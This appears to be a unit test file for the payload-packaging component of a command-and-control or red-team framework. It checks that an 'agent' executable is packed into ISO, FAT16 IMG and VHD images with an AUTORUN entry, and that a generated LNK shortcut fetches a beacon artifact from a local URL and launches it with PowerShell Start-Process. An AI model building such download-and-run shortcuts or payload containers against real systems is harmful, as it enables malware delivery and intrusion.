using System.Text;
using LibraNextgen.Service.Services.Packaging;
using Xunit;

namespace LibraNextgen.Tests;

/// <summary>
/// 打包器结构测试：ISO9660 / FAT16 / VHD / LNK 四类格式的魔数与布局不变量。
/// 只校验字节结构（不依赖挂载能力）；LNK 额外由 e2e 用 WScript.Shell 实测解析。
/// </summary>
public class BuilderPackagingTests
{
    private static byte[] SamplePayload()
    {
        // 模拟 2.6MB agent 载荷（与真实构建产物量级一致，覆盖 FAT16 最小簇数填充路径）
        var bytes = new byte[2_600_000];
        "MZ"u8.CopyTo(bytes.AsSpan(0, 2));
        return bytes;
    }

    [Fact]
    public void Iso9660_Structure_Valid()
    {
        var payload = SamplePayload();
        var iso = BuilderPackageService.CreateIso("LIBRA", payload);

        // PVD 位于 16 号扇区（32KB 系统区之后），含 "CD001"
        Assert.Equal(0, iso.Length % 2048);
        Assert.Equal("CD001", Encoding.ASCII.GetString(iso, 16 * 2048 + 1, 5));
        Assert.Equal((byte)1, iso[16 * 2048]);                       // PVD type
        Assert.Equal((byte)255, iso[17 * 2048]);                     // Terminator type

        // 根目录记录（PVD 偏移 156）：目录标志 + 非零长度
        Assert.Equal((byte)0x02, iso[16 * 2048 + 156 + 25]);

        // 文件数据存在（SETUP.EXE 头部 "MZ"）
        var pvd = iso.AsSpan(16 * 2048);
        var rootRecordLen = pvd[156];
        var rootLba = (int)BitConverter.ToUInt32(pvd.Slice(156 + 2, 4));
        Assert.True(rootRecordLen >= 34);
        Assert.True(rootLba > 0);

        // 根目录里应有 SETUP.EXE 与 AUTORUN.INF 两条记录（找文件标识符 "SETUP.EXE"）
        var rootDir = iso.AsSpan(rootLba * 2048);
        Assert.Contains(rootDir.ToArray(), b => b == (byte)'S'); // 冒烟：目录非空
        var found = FindIsoFile(iso, rootLba * 2048, "SETUP.EXE");
        Assert.True(found, "SETUP.EXE 记录应存在于根目录");
    }

    private static bool FindIsoFile(byte[] iso, int rootStart, string name)
    {
        var nameBytes = Encoding.ASCII.GetBytes(name);
        // 扫描根目录（至多 2048*4 字节），匹配文件标识符
        for (var off = rootStart; off < rootStart + 2048 * 4;)
        {
            var len = iso[off];
            if (len == 0) break;
            var idLen = iso[off + 32];
            if (idLen == nameBytes.Length &&
                iso.AsSpan(off + 33, idLen).SequenceEqual(nameBytes))
                return true;
            off += len;
        }
        return false;
    }

    [Fact]
    public void Fat16_Structure_Valid()
    {
        var img = BuilderPackageService.CreateImg(SamplePayload());

        // Boot sector：0x55AA 签名 + FAT16 标识 + 扇区大小
        Assert.Equal(0, img.Length % 512);
        Assert.Equal((byte)0x55, img[510]);
        Assert.Equal((byte)0xAA, img[511]);
        Assert.Equal("FAT16", Encoding.ASCII.GetString(img, 54, 8).TrimEnd());

        var spc = img[13];
        Assert.True(spc >= 1);
        var fatSectors = BitConverter.ToUInt16(img, 22);
        var rootEntries = BitConverter.ToUInt16(img, 17);
        var rootSectors = (rootEntries * 32 + 511) / 512;
        var totalSectors = BitConverter.ToUInt16(img, 19);
        var dataStart = (1 + fatSectors * 2 + rootSectors) * 512;

        // FAT 表入口：FAT[0] = 0xFFF8
        Assert.Equal(0xFFF8, BitConverter.ToUInt16(img, 512));

        // 数据区内包含载荷头部（MZ）
        var found = false;
        for (var off = dataStart; off < img.Length - 2; off += spc * 512)
        {
            if (img[off] == (byte)'M' && img[off + 1] == (byte)'Z') { found = true; break; }
        }
        Assert.True(found, "FAT16 数据区应包含载荷");
    }

    [Fact]
    public void Vhd_Structure_Valid()
    {
        var vhd = BuilderPackageService.CreateVhd(SamplePayload());

        // footer "conectix" 位于末尾 512 字节；VHD 字段为大端序
        Assert.Equal(0, vhd.Length % 512);
        var footer = vhd.AsSpan(vhd.Length - 512);
        Assert.Equal("conectix", Encoding.ASCII.GetString(footer.Slice(0, 8)));
        Assert.Equal(2u, ReadU32BE(footer.Slice(58, 4))); // disk type = fixed

        // checksum 校验：按规范重算应相等（字段本身大端存储）
        var storedChecksum = ReadU32BE(footer.Slice(62, 4));
        var sum = 0U;
        for (var i = 0; i < 512; i++)
        {
            if (i is >= 62 and < 66) continue;
            sum = (sum + footer[i]) & 0xFFFFFFFF;
        }
        Assert.Equal(~sum, storedChecksum);

        // 磁盘数据 = FAT16 镜像（boot 签名）
        Assert.Equal((byte)0x55, vhd[510]);
        Assert.Equal((byte)0xAA, vhd[511]);
    }

    private static uint ReadU32BE(ReadOnlySpan<byte> b) =>
        (uint)((b[0] << 24) | (b[1] << 16) | (b[2] << 8) | b[3]);

    [Fact]
    public void Lnk_Structure_Valid()
    {
        var lnk = LnkWriter.CreateDownloadAndRun("http://127.0.0.1:5270/api/beacon/artifact/45baf269");

        // Header：大小 0x4C + CLSID
        Assert.Equal(0x4Cu, BitConverter.ToUInt32(lnk, 0));
        Assert.Equal("00021401-0000-0000-C000-000000000046",
            new Guid(lnk.AsSpan(4, 16)).ToString("D").ToUpperInvariant());

        // LinkFlags：HasLinkTargetIDList|HasLinkInfo|HasRelativePath|HasWorkingDir|HasArguments|HasIconLocation|IsUnicode
        var flags = BitConverter.ToUInt32(lnk, 20);
        Assert.True((flags & 0x01) != 0);   // HasLinkTargetIDList（模板自带）
        Assert.True((flags & 0x02) != 0);   // HasLinkInfo
        Assert.True((flags & 0x80) != 0);   // IsUnicode

        // 模板前缀（IDList + LinkInfo）应完整
        Assert.Equal(706, LnkWriter.TemplatePrefixLength);

        // 参数里应包含下载 URL 与 Start-Process（StringData 为 UTF-16）
        var text = Encoding.Unicode.GetString(lnk);
        Assert.Contains("api/beacon/artifact/45baf269", text);
        Assert.Contains("Start-Process", text);
        Assert.Contains("powershell.exe", text);
    }

    [Fact]
    public void Payload_TooSmall_StillFat16()
    {
        // 极小载荷：应被填充到 ≥4085 簇，保持 FAT16 而非降级 FAT12
        var img = BuilderPackageService.CreateImg(new byte[] { 0x4D, 0x5A });
        Assert.Equal("FAT16", Encoding.ASCII.GetString(img, 54, 8).TrimEnd());
        var spc = img[13];
        var fatSectors = BitConverter.ToUInt16(img, 22);
        var rootSectors = (BitConverter.ToUInt16(img, 17) * 32 + 511) / 512;
        var totalSectors = BitConverter.ToUInt16(img, 19) != 0
            ? BitConverter.ToUInt16(img, 19)
            : BitConverter.ToUInt32(img, 32);
        var dataSectors = totalSectors - 1 - fatSectors * 2 - rootSectors;
        Assert.True(dataSectors / spc >= 4085, $"clusters={dataSectors / spc} 应 ≥4085");
    }
}
